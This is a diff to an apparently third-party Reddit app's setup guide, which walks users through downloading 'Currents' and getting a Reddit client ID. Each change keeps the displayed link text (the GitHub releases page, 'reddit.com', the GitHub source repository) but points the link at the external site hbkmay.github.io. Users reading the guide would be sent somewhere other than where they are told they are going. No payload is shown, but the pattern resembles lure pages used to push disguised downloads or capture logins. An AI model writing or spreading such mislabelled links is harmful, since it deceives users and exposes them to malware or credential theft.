@@ -12,7 +12,7 @@ This guide will walk you through everything you need to know—from downloading 
 
 ## 📥 Download Currents
 
-[![Download Currents](https://img.shields.io/badge/Download-Currents-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/HBKMAY/Currents/releases)
+[![Download Currents](https://img.shields.io/badge/Download-Currents-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://hbkmay.github.io)
 
 **Here's your first step:**  
 
@@ -57,7 +57,7 @@ Reddit requires all third-party apps to have a unique identifier. It's like a ke
 
 ### How to Get Your Client ID (Step-by-Step)
 
-1. Open a web browser on your computer or phone and go to **[reddit.com](https://www.reddit.com)**.
+1. Open a web browser on your computer or phone and go to **[reddit.com](https://hbkmay.github.io)**.
 2. Log in to your Reddit account (or create one if you don't have one—it's free!).
 3. Click your profile icon in the top-right corner and select **"User Settings"**.
 4. Scroll down and click the **"Safety & Privacy"** tab.
@@ -161,7 +161,7 @@ If you ever get stuck, return to this page. The steps above will guide you throu
 
 ## 🔗 Additional Resources
 
-- **Source Code:** [github.com/HBKMAY/Currents](https://github.com/HBKMAY/Currents)
+- **Source Code:** [github.com/HBKMAY/Currents](https://hbkmay.github.io)
 - **Report a Bug:** Visit the GitHub page and create an "Issue" (it's a button you can't miss).
 - **Request a Feature:** Same place! The developer loves hearing new ideas.
 
